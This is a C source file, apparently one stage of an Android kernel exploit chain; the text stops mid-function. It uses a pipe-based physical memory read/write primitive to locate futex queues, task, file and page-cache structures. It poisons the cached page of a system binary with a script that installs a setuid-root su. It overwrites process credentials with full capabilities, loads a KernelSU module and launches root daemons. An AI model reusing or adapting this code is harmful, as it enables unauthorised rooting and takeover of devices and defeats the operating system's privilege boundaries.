#include "common.h"
#include <stdarg.h>

#define CHAIN_TARGET_PATH "/system_ext/bin/aee_core_forwarder_v2"
#define CHAIN_GLM_DONE "/data/local/tmp/glm.done"
#define CHAIN_GLSU_PATH "/data/local/tmp/glsu9"
#define CHAIN_SU_PATH "/data/local/tmp/su"
#define CHAIN_SU_SOCK "/data/local/tmp/temp_su.sock"
#define CHAIN_GLSU_PATH_FALLBACK "/data/local/tmp/glsu10"
#define CHAIN_SU_PATH_FALLBACK "/data/local/tmp/su2"
#define CHAIN_SU_SOCK_FALLBACK "/data/local/tmp/temp_su2.sock"
#define CHAIN_KSU_KO_PATH "/data/local/tmp/kernelsu-device-ready.ko"
#define CHAIN_KSUD_PATH "/data/local/tmp/ksud"
#define CHAIN_THREAD_NAME "chain-waiter"
#define CHAIN_WAIT_SECONDS 120
#define CHAIN_GLM_TIMEOUT_USEC 10000000
static struct timespec chain_t0;
static long chain_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - chain_t0.tv_sec) * 1000L +
         (now.tv_nsec - chain_t0.tv_nsec) / 1000000L;
}
static const char *chain_stage = "init";
static atomic_int chain_hb_stop = 0;
static void *chain_heartbeat_thread(void *arg __attribute__((unused))) {
  int tick = 0;
  usleep(50000);
  while (!atomic_load(&chain_hb_stop)) {
    pr_info("chain heartbeat t=%ldms tick=%d stage=%s\n", chain_ms(),
            ++tick, chain_stage);
    usleep(500000);
  }
  return NULL;
}
static void chain_park(const char *why) {
  pr_warning("chain park t=%ldms stage=%s why=%s\n", chain_ms(),
             chain_stage, why);
  for (;;) {
    pause();
  }
}

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

#define OFF_TASK_FILES 0x878
#define OFF_TASK_PID 0x630
#define OFF_TASK_COMM 0x848
#define OFF_FILES_FDT 0x20
#define OFF_FDT_MAX_FDS 0x0
#define OFF_FDT_FD 0x8
#define OFF_FILE_F_INODE 0x20
#define OFF_FILE_F_OP 0x28
#define OFF_INODE_I_MODE 0x0
#define OFF_INODE_I_DATA 0x190
#define OFF_ADDRSPACE_I_PAGES 0x8
#define OFF_XARRAY_XA_HEAD 0x8
#define OFF_XA_NODE_SLOTS 0x28
#define OFF_FUTEX_Q_TASK 0x28
#define OFF_FUTEX_Q_KEY 0x38
#define OFF_KEY_MM 0x0
#define OFF_KEY_ADDRESS 0x8
#define OFF_KEY_OFFSET 0x10
#define OFF_HB_CHAIN 0x10
#define OFF_PLIST_NODE_LIST 0x18

#define DATA_FUTEX_QUEUES_PTR 0xffffffc00a0fb020ULL
#define DATA_FUTEX_HASHSIZE 0xffffffc00a0fb030ULL

static uint32_t chain_f_wait;
static uint32_t chain_f_dummy;
static atomic_int chain_waiter_ready;
static atomic_int chain_waiter_tid;
static int chain_tfd = -1;

static const char *chain_glsu_effective = CHAIN_GLSU_PATH;
static const char *chain_su_effective = CHAIN_SU_PATH;
static const char *chain_sock_effective = CHAIN_SU_SOCK;

static int chain_glsu_write(const char *path, size_t size) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
  if (fd < 0) {
    unlink(path);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
  }
  if (fd < 0) {
    return 0;
  }
  size_t off = 0;
  int ok = 1;
  while (off < size) {
    ssize_t w = write(fd, embedded_su_start + off, size - off);
    if (w <= 0) {
      ok = 0;
      break;
    }
    off += (size_t)w;
  }
  int saved_errno = errno;
  close(fd);
  if (!ok) {
    errno = saved_errno;
    return 0;
  }
  return 1;
}

static int chain_install_glsu(void) {
  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  struct stat st;
  static uint8_t glsu_disk[65536];
  if (stat(CHAIN_GLSU_PATH, &st) == 0 && st.st_size == (off_t)size &&
      size <= sizeof(glsu_disk)) {
    int dfd = open(CHAIN_GLSU_PATH, O_RDONLY | O_CLOEXEC);
    if (dfd < 0) {
      pr_warning("chain v108.1 glsu content read failed path=%s "
                 "errno=%d - rewrite attempt follows\n", CHAIN_GLSU_PATH,
                 errno);
    } else {
      ssize_t r = read(dfd, glsu_disk, size);
      close(dfd);
      if (r == (ssize_t)size &&
          memcmp(glsu_disk, embedded_su_start, size) == 0) {
        return 1;
      }
    }
    pr_warning("chain glsu stale (size matched, content != embedded "
               "blob) - rewriting\n");
  }
  if (chain_glsu_write(CHAIN_GLSU_PATH, size)) {
    pr_success("chain glsu wrote %zu bytes to %s\n", size,
               CHAIN_GLSU_PATH);
    return 1;
  }
  int write_errno = errno;
  pr_warning("chain v108.1 glsu fallback path=%s (reason errno=%d)\n",
             CHAIN_GLSU_PATH_FALLBACK, write_errno);
  chain_glsu_effective = CHAIN_GLSU_PATH_FALLBACK;
  if (chain_glsu_write(CHAIN_GLSU_PATH_FALLBACK, size)) {
    pr_success("chain glsu wrote %zu bytes to %s\n", size,
               CHAIN_GLSU_PATH_FALLBACK);
    return 1;
  }
  pr_warning("chain glsu fallback write failed path=%s errno=%d\n",
             CHAIN_GLSU_PATH_FALLBACK, errno);
  return 0;
}

void *chain_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pthread_setname_np(pthread_self(), CHAIN_THREAD_NAME);
  atomic_store(&chain_waiter_tid, (int)syscall(SYS_gettid));
  pr_info("chain waiter thread enter tid=%d\n", (int)syscall(SYS_gettid));

  struct timespec now_ts;
  clock_gettime(CLOCK_MONOTONIC, &now_ts);
  struct timespec timeout = {
    .tv_sec = now_ts.tv_sec + CHAIN_WAIT_SECONDS,
    .tv_nsec = now_ts.tv_nsec,
  };
  atomic_store(&chain_waiter_ready, 1);
  long fret = futex_op(&chain_f_wait, FUTEX_WAIT_REQUEUE_PI | 128, 0,
                       &timeout, &chain_f_dummy, 0);
  int ferr = errno;
  pr_info("chain waiter futex ret=%ld errno=%d tid=%d t=%ldms\n", fret,
          ferr, (int)syscall(SYS_gettid), chain_ms());
  return NULL;
}

static int chain_locate_futex_q(
    int fd, uintptr_t *q_out, uintptr_t *task_out) {
  uint64_t fq = kernel_read64(fd, data_addr(DATA_FUTEX_QUEUES_PTR));
  uint32_t hsize = (uint32_t)kernel_read64(fd, data_addr(DATA_FUTEX_HASHSIZE));
  if (fq == 0 || hsize == 0 || hsize > 0x100000) {
    pr_warning("chain futex data fq=%016llx hsize=%u\n",
               (unsigned long long)fq, hsize);
    return 0;
  }
  uint64_t want = (uint64_t)(uintptr_t)&chain_f_wait;
  uint64_t want_page = want & ~(uint64_t)(PAGE_SIZE - 1);
  uint32_t want_off = (uint32_t)(want & (PAGE_SIZE - 1));
  pr_info("chain futex_queues=%016llx hashsize=%u want=%016llx "
          "page=%016llx off=%u\n",
          (unsigned long long)fq, hsize, (unsigned long long)want,
          (unsigned long long)want_page, want_off);
  pr_info("chain locate t=%ldms\n", chain_ms());

  {
    static uint8_t hbuf[256];
    char hex[129];
    if (pipe_splice_read_range(fd, fq, hbuf, sizeof(hbuf))) {
      for (uint32_t b = 0; b < 4; b++) {
        for (size_t j = 0; j < 64; j++) {
          snprintf(hex + j * 2, sizeof(hex) - j * 2, "%02x",
                   hbuf[b * 64 + j]);
        }
        pr_info("chain hb[%u] = %s\n", b, hex);
      }
    } else {
      pr_warning("chain hb dump read failed\n");
    }
  }
  uint32_t nonempty_seen = 0;
  for (uint32_t i = 0; i < hsize; i++) {
    if ((i & 0xff) == 0xff)
      pr_info("chain scan i=%u t=%ldms\n", i, chain_ms());
    uintptr_t self = fq + (uintptr_t)i * 64 + OFF_HB_CHAIN;
    uint64_t next = kernel_read64(fd, self);
    if (next == 0 || next == self) {
      continue;
    }
    nonempty_seen++;
    if (nonempty_seen <= 16) {
      uintptr_t dq = (uintptr_t)next - OFF_PLIST_NODE_LIST;
      uint64_t dkey = 0, dmm = 0, dtask = 0;
      uint32_t doff = 0;
      if (is_kernel_ptr(dq)) {
        dkey = kernel_read64(fd, dq + OFF_FUTEX_Q_KEY + OFF_KEY_ADDRESS);
        dmm = kernel_read64(fd, dq + OFF_FUTEX_Q_KEY + OFF_KEY_MM);
        doff = (uint32_t)kernel_read64(fd, dq + OFF_FUTEX_Q_KEY + OFF_KEY_OFFSET);
        dtask = kernel_read64(fd, dq + OFF_FUTEX_Q_TASK);
      }
      pr_info("chain diag bucket=%u next=%016llx q=%016zx "
              "key_addr=%016llx mm=%016llx koff=%u task=%016llx\n",
              i, (unsigned long long)next, dq,
              (unsigned long long)dkey, (unsigned long long)dmm,
              doff, (unsigned long long)dtask);
    }
    uintptr_t q = (uintptr_t)next - OFF_PLIST_NODE_LIST;
    if (!is_kernel_ptr(q)) {
      continue;
    }
    uint64_t key_addr = kernel_read64(fd, q + OFF_FUTEX_Q_KEY + OFF_KEY_ADDRESS);
    if (key_addr != want_page) {
      continue;
    }
    uint32_t koff = (uint32_t)kernel_read64(fd,
        q + OFF_FUTEX_Q_KEY + OFF_KEY_OFFSET);
    if (koff != want_off) {
      continue;
    }
    uint64_t mm = kernel_read64(fd, q + OFF_FUTEX_Q_KEY + OFF_KEY_MM);
    if (!is_kernel_ptr(mm)) {
      continue;
    }
    uint64_t task = kernel_read64(fd, q + OFF_FUTEX_Q_TASK);
    if (!is_kernel_ptr(task)) {
      continue;
    }
    uint8_t tbuf[OFF_TASK_COMM + 16];
    if (!pipe_splice_read_range(fd, task, tbuf, sizeof(tbuf))) {
      continue;
    }
    uint32_t pid = *(uint32_t *)(tbuf + OFF_TASK_PID);
    if (pid != (uint32_t)atomic_load(&chain_waiter_tid)) {
      continue;
    }
    if (memcmp(tbuf + OFF_TASK_COMM, CHAIN_THREAD_NAME,
               sizeof(CHAIN_THREAD_NAME) - 1) != 0) {
      continue;
    }
    pr_success("chain futex_q=%016zx task=%016zx bucket=%u pid=%u comm=%.15s\n",
               q, (uintptr_t)task, i, (unsigned int)pid,
               (char *)(tbuf + OFF_TASK_COMM));
    *q_out = q;
    *task_out = (uintptr_t)task;
    return 1;
  }
  pr_info("chain scan done t=%ldms\n", chain_ms());
  pr_warning("chain futex_q not found (scanned %u buckets, "
             "nonempty_seen=%u)\n", hsize, nonempty_seen);
  return 0;
}

static uintptr_t chain_locate_task_walk(int fd) {
  uint32_t want = (uint32_t)getpid();
  uintptr_t task = (uintptr_t)find_task_by_tgid(fd, want);
  if (task == 0 || !is_direct_ptr(task)) {
    pr_warning("chain task walk miss tgid=%u iters=%d last_pid=%u\n",
               want, task_walk_iters, task_walk_last_pid);
    return 0;
  }
  uint8_t tb[TASK_COMM_OFF + TASK_COMM_LEN];
  if (!pipe_splice_read_range(fd, task, tb, sizeof(tb)) ||
      *(uint32_t *)(tb + TASK_TGID_OFF) != want) {
    pr_warning("chain task walk verify failed task=%016zx\n", task);
    return 0;
  }
  pr_success("chain task walk hit task=%016zx pid=%u tgid=%u "
             "comm=%.15s iters=%d\n",
             task, *(uint32_t *)(tb + TASK_PID_OFF),
             *(uint32_t *)(tb + TASK_TGID_OFF),
             (char *)(tb + TASK_COMM_OFF), task_walk_iters);
  return task;
}

static int chain_get_files(int fd, uintptr_t task, uintptr_t *files_out) {
  uint8_t tbuf[OFF_TASK_FILES + 8];
  if (!pipe_splice_read_range(fd, task, tbuf, sizeof(tbuf))) {
    pr_warning("chain task splice read failed task=%016zx\n", task);
    return 0;
  }
  uint64_t files = *(uint64_t *)(tbuf + OFF_TASK_FILES);
  if (!is_kernel_ptr(files)) {
    pr_warning("chain bad files=%016llx\n", (unsigned long long)files);
    return 0;
  }
  pr_success("chain files_struct=%016llx\n", (unsigned long long)files);
  *files_out = (uintptr_t)files;
  return 1;
}

static int chain_get_filp(int fd, uintptr_t files, int tfd,
                          uintptr_t *filp_out) {
  uint8_t fbuf[OFF_FILES_FDT + 8];
  if (!pipe_splice_read_range(fd, files, fbuf, sizeof(fbuf))) {
    pr_warning("chain files splice read failed files=%016zx\n", files);
    return 0;
  }
  uint64_t fdt = *(uint64_t *)(fbuf + OFF_FILES_FDT);
  if (!is_kernel_ptr(fdt)) {
    pr_warning("chain bad fdt=%016llx\n", (unsigned long long)fdt);
    return 0;
  }
  uint8_t dt[OFF_FDT_FD + 8];
  if (!pipe_splice_read_range(fd, (uintptr_t)fdt, dt, sizeof(dt))) {
    pr_warning("chain fdtable splice read failed fdt=%016llx\n",
               (unsigned long long)fdt);
    return 0;
  }
  uint32_t max_fds = *(uint32_t *)(dt + OFF_FDT_MAX_FDS);
  uint64_t fd_ptrs = *(uint64_t *)(dt + OFF_FDT_FD);
  if (fd_ptrs == 0 || (uint32_t)tfd >= max_fds) {
    pr_warning("chain fd out of table tfd=%d max_fds=%u fd_ptrs=%016llx\n",
               tfd, max_fds, (unsigned long long)fd_ptrs);
    return 0;
  }
  uint64_t filp = 0;
  if (!pipe_splice_read_range(fd, (uintptr_t)fd_ptrs + (uintptr_t)tfd * 8,
                              &filp, sizeof(filp))) {
    pr_warning("chain fd array splice read failed fd_ptrs=%016llx\n",
               (unsigned long long)fd_ptrs);
    return 0;
  }
  if (!is_kernel_ptr(filp)) {
    pr_warning("chain bad filp=%016llx\n", (unsigned long long)filp);
    return 0;
  }
  uint8_t fb[OFF_FILE_F_OP + 8];
  if (!pipe_splice_read_range(fd, (uintptr_t)filp, fb, sizeof(fb))) {
    pr_warning("chain filp splice read failed filp=%016llx\n",
               (unsigned long long)filp);
    return 0;
  }
  uint64_t f_op = *(uint64_t *)(fb + OFF_FILE_F_OP);
  uint64_t f_inode = *(uint64_t *)(fb + OFF_FILE_F_INODE);
  if (!is_kernel_ptr(f_op) || !is_kernel_ptr(f_inode)) {
    pr_warning("chain bad filp f_op=%016llx f_inode=%016llx base=%016llx\n",
               (unsigned long long)f_op, (unsigned long long)f_inode,
               (unsigned long long)kaslr_base);
    return 0;
  }
  pr_success("chain filp=%016llx f_op=%016llx f_inode=%016llx\n",
             (unsigned long long)filp, (unsigned long long)f_op,
             (unsigned long long)f_inode);
  *filp_out = (uintptr_t)filp;
  return 1;
}

static int chain_get_xa_head(int fd, uintptr_t filp, uint64_t *xa_head_out) {
  uint8_t fb[OFF_FILE_F_INODE + 8];
  if (!pipe_splice_read_range(fd, filp, fb, sizeof(fb))) {
    pr_warning("chain filp re-read failed filp=%016zx\n", filp);
    return 0;
  }
  uint64_t inode = *(uint64_t *)(fb + OFF_FILE_F_INODE);
  if (!is_kernel_ptr(inode)) {
    pr_warning("chain bad inode=%016llx\n", (unsigned long long)inode);
    return 0;
  }
  uint8_t ib[OFF_INODE_I_DATA + OFF_ADDRSPACE_I_PAGES + OFF_XARRAY_XA_HEAD + 8];
  if (!pipe_splice_read_range(fd, (uintptr_t)inode, ib, sizeof(ib))) {
    pr_warning("chain inode splice read failed inode=%016llx\n",
               (unsigned long long)inode);
    return 0;
  }
  uint32_t i_mode = *(uint32_t *)(ib + OFF_INODE_I_MODE);
  if ((i_mode & 0170000) != 0100000) {
    pr_warning("chain inode not regular file mode=%o\n", i_mode & 07777);
    return 0;
  }
  uint64_t xa_head =
      *(uint64_t *)(ib + OFF_INODE_I_DATA + OFF_ADDRSPACE_I_PAGES +
                    OFF_XARRAY_XA_HEAD);
  pr_success("chain inode=%016llx mode=%o xa_head=%016llx\n",
             (unsigned long long)inode, i_mode & 07777,
             (unsigned long long)xa_head);
  *xa_head_out = xa_head;
  return 1;
}

static int chain_decode_first_page(int fd, uint64_t xa_head,
                                   uintptr_t *page_direct_out) {
  uintptr_t page = 0;
  if (xa_head & 1) {
    pr_warning("chain xa_head is value/retry entry=%016llx\n",
               (unsigned long long)xa_head);
    return 0;
  }
  page = (uintptr_t)xa_head;
  int depth = 0;
  while ((page & 3) == 2 && depth < 8) {
    uintptr_t node = page & ~3ULL;
    uint8_t nb[OFF_XA_NODE_SLOTS + 8];
    if (!pipe_splice_read_range(fd, node, nb, sizeof(nb))) {
      pr_warning("chain xa_node splice read failed node=%016zx depth=%d\n",
                 node, depth);
      return 0;
    }
    uintptr_t slot0 = *(uint64_t *)(nb + OFF_XA_NODE_SLOTS);
    if (slot0 == 0) {
      pr_warning("chain xa_node slots[0] empty node=%016zx depth=%d\n",
                 node, depth);
      return 0;
    }
    if (slot0 & 1) {
      pr_warning("chain xa_node slots[0] value/retry entry=%016llx\n",
                 (unsigned long long)slot0);
      return 0;
    }
    page = slot0;
    depth++;
  }
  if (page == 0) {
    pr_warning("chain empty xarray\n");
    return 0;
  }
  if (page < VMEMMAP_START || page >= VMEMMAP_END || (page & 0x7)) {
    pr_warning("chain bad folio=%016zx\n", page);
    return 0;
  }
  uintptr_t direct = page_to_direct(page);
  if (!is_direct_ptr(direct)) {
    pr_warning("chain bad page_to_direct folio=%016zx direct=%016zx\n", page,
               direct);
    return 0;
  }
  pr_success("chain page0 folio=%016zx direct=%016zx\n", page, direct);
  *page_direct_out = direct;
  return 1;
}

static int chain_poison_page(int fd, uintptr_t page_direct) {
  uint8_t poison[PAGE_SIZE];
  const char *script =
      "#!/system/bin/sh\n"
      "export PATH=/system/bin:/system/xbin\n"
      "cp /data/local/tmp/glsu9 /data/local/tmp/su || exit 1\n"
      "chmod 4755 /data/local/tmp/su\n"
      "/data/local/tmp/su --daemon >/data/local/tmp/glm_daemon.log 2>&1 &\n"
      "echo done > /data/local/tmp/glm.done\n"
      "exit 0\n";
  size_t slen = strlen(script);
  if (slen + 2 > sizeof(poison)) {
    pr_error("chain script too long %zu\n", slen);
    return 0;
  }
  memcpy(poison, script, slen);
  memset(poison + slen, '#', sizeof(poison) - slen - 1);
  poison[sizeof(poison) - 1] = '\n';

  if (!pipe_phys_write_data(fd, page_direct, poison, sizeof(poison))) {
    pr_error("chain poison write failed\n");
    return 0;
  }
  uint8_t back[64];
  if (!pipe_phys_read_data(fd, page_direct, back, sizeof(back)) ||
      memcmp(back, poison, sizeof(back)) != 0) {
    pr_error("chain poison verify failed\n");
    return 0;
  }
  pr_success("chain poisoned page0 direct=%016zx script=%zu bytes\n",
             page_direct, slen);
  if (env_flag("SLIDE_VFS_VERIFY", 1)) {
    uint8_t vbuf[256];
    memset(vbuf, 0, sizeof(vbuf));
    ssize_t vn = pread(chain_tfd, vbuf, sizeof(vbuf), 0);
    int match = vn >= (ssize_t)slen && memcmp(vbuf, script, slen) == 0;
    pr_info("chain vfs readback match=%d len=%zd "
            "head=%02x%02x%02x%02x%02x%02x%02x%02x...\n",
            match, vn, vbuf[0], vbuf[1], vbuf[2], vbuf[3],
            vbuf[4], vbuf[5], vbuf[6], vbuf[7]);
    if (!match) {
      pr_warning("!! poison not visible via VFS - page decode suspect\n");
    }
  }
  return 1;
}

#define CHAIN_CRED_SCAN_BYTES 0x1000
#define CHAIN_CRED_USAGE_MAX 100000u
#define CHAIN_CRED_ID_COUNT 8
#define OFF_TASK_REAL_CRED 0x830
#define OFF_TASK_CRED 0x838

static int chain_cred_validate(int fd, uintptr_t p, const char *tag,
                               uint32_t *usage_out) {
  uint8_t buf[4 + 4 * CHAIN_CRED_ID_COUNT];
  if (p == 0 || !is_direct_ptr(p)) {
    if (tag)
      pr_warning("chain cred validate fail %s=%016zx (null or out of "
                 "direct map)\n", tag, p);
    return 0;
  }
  if ((p & 7) != 0 ||
      (p & (PAGE_SIZE - 1)) > PAGE_SIZE - sizeof(buf)) {
    if (tag)
      pr_warning("chain cred validate fail %s=%016zx (alignment)\n", tag, p);
    return 0;
  }
  if (!pipe_splice_read_range(fd, p, buf, sizeof(buf))) {
    if (tag)
      pr_warning("chain cred validate fail %s=%016zx (splice read)\n",
                 tag, p);
    return 0;
  }
  uint32_t usage = *(uint32_t *)(buf + 0);
  if (usage == 0 || usage > CHAIN_CRED_USAGE_MAX) {
    if (tag)
      pr_warning("chain cred validate fail %s=%016zx usage=%u\n",
                 tag, p, usage);
    return 0;
  }
  uint32_t uid = (uint32_t)getuid();
  for (int k = 0; k < CHAIN_CRED_ID_COUNT; k++) {
    uint32_t id = *(uint32_t *)(buf + 4 + 4 * k);
    if (id != uid) {
      if (tag)
        pr_warning("chain cred validate fail %s=%016zx id#%d=%u want=%u\n",
                   tag, p, k, id, uid);
      return 0;
    }
  }
  *usage_out = usage;
  return 1;
}

static int chain_pipebuf_revalidate(int fd) {
  return find_pipe_buffer(fd, pipebuf_page_base) && pipebuf_addr != 0 &&
         pipebuf_pipe_idx >= 0;
}
static int chain_step_errno;
static void chain_step_fail(const char *step, const char *what, int ret) {
  pr_warning("chain v101 %s FAIL %s ret=%d errno=%d(%s)\n", step, what,
             ret, chain_step_errno, strerror(chain_step_errno));
  chain_park(step);
}
static void chain_step_write(int fd, const char *step, uintptr_t addr,
                             const void *data, size_t len) {
  chain_stage = step;
  fflush(stdout);
  pr_info("chain v101 %s write addr=%016zx len=%zu via idx=%d\n", step,
          addr, len, pipebuf_pipe_idx);
  int ok = pipe_phys_write_data(fd, addr, data, len);
  chain_step_errno = errno;
  if (!ok) {
    chain_step_fail(step, "phys write", ok);
  }
}
static void chain_step_read(int fd, const char *step, uintptr_t addr,
                            void *out, size_t len) {
  chain_stage = step;
  int ok = pipe_splice_read_range(fd, addr, out, len);
  chain_step_errno = errno;
  if (!ok) {
    chain_step_fail(step, "phys read", ok);
  }
}
static void chain_step_verify(const char *step, const void *got,
                              const void *want, size_t len) {
  if (memcmp(got, want, len) == 0) {
    return;
  }
  char ghex[33], whex[33];
  size_t n = len < 16 ? len : 16;
  for (size_t i = 0; i < n; i++) {
    snprintf(ghex + 2 * i, 3, "%02x", ((const uint8_t *)got)[i]);
    snprintf(whex + 2 * i, 3, "%02x", ((const uint8_t *)want)[i]);
  }
  ghex[2 * n] = 0;
  whex[2 * n] = 0;
  pr_warning("chain v101 %s FAIL readback got=%s want=%s\n", step, ghex,
             whex);
  chain_park("readback mismatch");
}

static void chain_cred_patch_caps(int fd, uintptr_t p, const char *tag) {
  uint8_t wr[40];
  uint8_t rb[sizeof(wr)];
  uint64_t cap = CAP_FULL;
  uint64_t rbq[5];
  uint32_t securebits;
  uint64_t inh, perm, eff, bset;

  if (!env_flag("SLIDE_CAPS_WRITE", 1)) {
    pr_info("chain v101 caps skip %s=%016zx (SLIDE_CAPS_WRITE=0)\n", tag, p);
    return;
  }
  if (!chain_pipebuf_revalidate(fd)) {
    chain_park("pipebuf revalidate failed (caps write)");
    return;
  }
  chain_stage = "caps-write";
  memset(wr, 0, sizeof(wr));
  memcpy(wr + 4, &cap, sizeof(cap));
  memcpy(wr + 12, &cap, sizeof(cap));
  memcpy(wr + 20, &cap, sizeof(cap));
  memcpy(wr + 28, &cap, sizeof(cap));
  fflush(stdout);
  pr_info("chain v101 caps write %s=%016zx addr=%016zx len=%zu "
          "val=%016zx via idx=%d\n",
          tag, p, p + CRED_SECUREBITS_OFF, sizeof(wr), (uint64_t)CAP_FULL,
          pipebuf_pipe_idx);
  if (!pipe_phys_write_data(fd, p + CRED_SECUREBITS_OFF, wr, sizeof(wr))) {
    pr_warning("chain v101 caps write failed %s=%016zx errno=%d - "
               "primitive dead, cred half-patched\n", tag, p, errno);
    chain_park("caps write failed");
    return;
  }
  chain_stage = "caps-readback";
  if (!pipe_splice_read_range(fd, p + CRED_SECUREBITS_OFF, rb, sizeof(rb))) {
    pr_warning("chain v101 caps readback failed %s=%016zx\n", tag, p);
    chain_park("caps readback failed");
    return;
  }
  memcpy(rbq, rb, sizeof(rbq));
  memcpy(&securebits, rb + 0, sizeof(securebits));
  memcpy(&inh, rb + 4, sizeof(inh));
  memcpy(&perm, rb + 12, sizeof(perm));
  memcpy(&eff, rb + 20, sizeof(eff));
  memcpy(&bset, rb + 28, sizeof(bset));
  fflush(stdout);
  pr_info("chain v101 caps readback =%016zx%016zx%016zx%016zx%016zx\n",
          rbq[0], rbq[1], rbq[2], rbq[3], rbq[4]);
  if (securebits != 0 || inh != CAP_FULL || perm != CAP_FULL ||
      eff != CAP_FULL || bset != CAP_FULL) {
    pr_warning("chain v101 caps readback mismatch %s=%016zx want "
               "securebits=0 caps=%016zx\n", tag, p, (uint64_t)CAP_FULL);
    chain_park("caps readback mismatch");
    return;
  }
  pr_success("chain v101 caps readback clean %s=%016zx securebits=%u\n",
             tag, p, securebits);
}
static void chain_step_a(int fd) {
  static const uint64_t magic = 0x3147414d34314153ULL;
  uint8_t rb[8];
  if (!chain_pipebuf_revalidate(fd)) {
    chain_park("pipebuf revalidate failed (step-a)");
    return;
  }
  uintptr_t scratch = pipebuf_addr + 0x200 + 0x14;
  chain_step_write(fd, "step-a", scratch, &magic, sizeof(magic));
  chain_step_read(fd, "step-a", scratch, rb, sizeof(rb));
  chain_step_verify("step-a", rb, &magic, sizeof(magic));
  pr_success("chain v101 step-a clean scratch=%016zx (channel sane at "
             "the killer offset)\n", scratch);
}

static void chain_cred_dump(int fd, uintptr_t p) {
  uint8_t d[0x60];
  if (!pipe_splice_read_range(fd, p, d, sizeof(d))) {
    pr_warning("chain v101 cred page dump read failed cred=%016zx\n", p);
    return;
  }
  char hex[2 * sizeof(d) + 1];
  for (size_t i = 0; i < sizeof(d); i++) {
    snprintf(hex + 2 * i, 3, "%02x", d[i]);
  }
  fflush(stdout);
  pr_info("chain v101 cred page dump cred=%016zx =%s\n", p, hex);
}

static int chain_su_install_uid0(void);
static int chain_su_daemon_spawned;
static void chain_daemon_marker(const char *fmt, ...) {
  char m[160];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(m, sizeof(m), fmt, ap);
  va_end(ap);
  if (n > 0) {
    size_t len = (size_t)n < sizeof(m) ? (size_t)n : sizeof(m) - 1;
    ssize_t w = write(1, m, len);
    (void)w;
  }
}

static int chain_lkm_attempted;
static void chain_lkm_ksud_exec(void) {
  fflush(stdout);
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("chain v109 ksud fork failed errno=%d\n", errno);
    return;
  }
  if (pid == 0) {
    chain_daemon_marker("chain v109 ksud child forked pid=%d\n",
                        (int)getpid());
    if (setsid() < 0) {
      pr_warning("chain v109 ksud setsid failed errno=%d\n", errno);
    }
    signal(SIGHUP, SIG_IGN);
    chain_daemon_marker("chain v109 ksud pre-exec pid=%d path=%s\n",
                        (int)getpid(), CHAIN_KSUD_PATH);
    static char *ksud_env[] = {NULL};
    execle(CHAIN_KSUD_PATH, "ksud", (char *)NULL, ksud_env);
    chain_daemon_marker("chain v109 ksud exec failed pid=%d errno=%d\n",
                        (int)getpid(), errno);
    _exit(127);
  }
  pr_info("chain v109 ksud exec spawned pid=%d (no wait - may "
          "self-daemonize)\n", (int)pid);
}

static void chain_lkm_insmod(void) {
  if (chain_lkm_attempted) {
    return;
  }
  chain_lkm_attempted = 1;
  int fd = open(CHAIN_KSU_KO_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_info("chain v109 kernelsu ko absent errno=%d - skip insmod, "
            "continuing to su daemon\n", errno);
    return;
  }
  long r = syscall(273, fd, "", 0);
  int ie = errno;
  close(fd);
  if (r != 0) {
    pr_warning("chain v109 insmod failed errno=%d (continuing to su "
               "daemon)\n", ie);
    return;
  }
  int in_list = 0;
  FILE *f = fopen("/proc/modules", "r");
  if (f != NULL) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      if (strstr(line, "kernelsu") != NULL) {
        in_list = 1;
        break;
      }
    }
    fclose(f);
  }
  if (in_list) {
    pr_success("chain v109 kernelsu module loaded\n");
  } else {
    pr_warning("chain v109 insmod ok but kernelsu not listed in "
               "/proc/modules (continuing)\n");
  }
  if (access(CHAIN_KSUD_PATH, X_OK) == 0) {
    chain_lkm_ksud_exec();
  } else {
    pr_info("chain v109 ksud absent errno=%d - skip ksud exec\n",
            errno);
  }
}

static int chain_su_spawn_daemon(void) {
  const char *sock_default = CHAIN_SU_SOCK;
  if (chain_su_daemon_spawned) {
    return 1;
  }
  chain_su_daemon_spawned = 1;
  for (int attempt = 1; attempt <= 3; attempt++) {
    pr_info("chain v109 su daemon spawn attempt %d/3\n", attempt);
    if (unlink(chain_sock_effective) != 0 && errno != ENOENT) {
      int ul_errno = errno;
      pr_warning("chain v108.1 socket fallback path=%s (reason "
                 "errno=%d)\n", CHAIN_SU_SOCK_FALLBACK, ul_errno);
      chain_sock_effective = CHAIN_SU_SOCK_FALLBACK;
      setenv("SU_SOCK_PATH", CHAIN_SU_SOCK_FALLBACK, 1);
    }
    pr_info("chain v109 su daemon socket effective path=%s "
            "(attempt %d)\n", chain_sock_effective, attempt);
    fflush(stdout);
    pid_t pid = fork();
    if (pid < 0) {
      pr_warning("chain v109 su daemon fork failed errno=%d "
                 "(attempt %d)\n", errno, attempt);
      continue;
    }
    if (pid == 0) {
      chain_daemon_marker("chain v109 su daemon child forked pid=%d\n",
                          (int)getpid());
      if (setsid() < 0) {
        pr_warning("chain v109 su daemon setsid failed errno=%d\n",
                   errno);
      }
      signal(SIGHUP, SIG_IGN);
      chain_daemon_marker("chain v109 child ids uid=%d euid=%d pid=%d\n",
                          (int)getuid(), (int)geteuid(), (int)getpid());
      chain_daemon_marker("chain v109 su daemon pre-exec pid=%d "
                          "path=%s sock=%s\n", (int)getpid(),
                          chain_su_effective, chain_sock_effective);
      execl(chain_su_effective, "su", "--daemon", (char *)NULL);
      chain_daemon_marker("chain v109 su daemon exec failed pid=%d "
                          "errno=%d\n", (int)getpid(), errno);
      _exit(127);
    }
    int st = 0;
    pid_t w = waitpid(pid, &st, WNOHANG);
    if (w == pid) {
      pr_warning("chain v109 su daemon child exited at probe "
                 "(attempt %d): WIFEXITED=%d code=%d WIFSIGNALED=%d "
                 "sig=%d\n", attempt, WIFEXITED(st) ? 1 : 0,
                 WIFEXITED(st) ? WEXITSTATUS(st) : 0,
                 WIFSIGNALED(st) ? 1 : 0,
                 WIFSIGNALED(st) ? WTERMSIG(st) : 0);
    } else {
